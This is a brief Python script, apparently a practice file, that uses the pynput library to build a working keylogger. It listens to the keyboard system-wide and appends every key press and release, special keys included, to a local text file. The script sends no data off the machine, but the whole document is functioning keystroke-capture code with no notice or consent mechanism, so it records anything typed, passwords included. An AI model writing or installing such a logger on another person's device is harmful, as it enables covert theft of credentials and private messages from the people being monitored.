from pynput import keyboard
import os

if os.path.exists("prova3.txt"):
    f = open("prova3.txt", "a")
else:
    f = open("prova3.txt", "x")

def on_press(key):
    try:
        f.writelines("///key [ {0} ] pressed ///".format(
            key.char))
    except AttributeError:
        f.writelines("///special key {0} pressed///".format(
            key))
        f.flush()

def on_release(key):
    text = ("///key [ {0} ] released ///".format(
        key))
    f.writelines(f'{text} \n')
    f.flush()

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

f.close()
